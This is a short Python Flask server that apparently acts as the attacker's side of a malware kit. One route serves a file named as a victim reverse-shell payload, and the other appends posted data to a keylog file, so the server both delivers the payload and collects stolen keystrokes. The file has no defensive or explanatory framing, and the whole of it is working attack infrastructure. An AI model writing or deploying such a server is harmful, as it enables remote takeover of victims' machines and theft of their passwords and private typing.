from flask import Flask, render_template, request
app = Flask(__name__)

@app.route('/', methods = ['GET'])
def get_payloads():
    with open('payloads/victim_reverse_shell.pyw', 'r') as f:
        return f.read()

@app.route('/log', methods = ['POST'])
def upload_file():
    if request.method == 'POST':
        with open("key_logs.txt", "a") as f:
            f.write(request.data.decode())
            f.write("\n" + "="*50 + "\n")
    return 'ok', 200

if __name__ == '__main__':
    app.run()
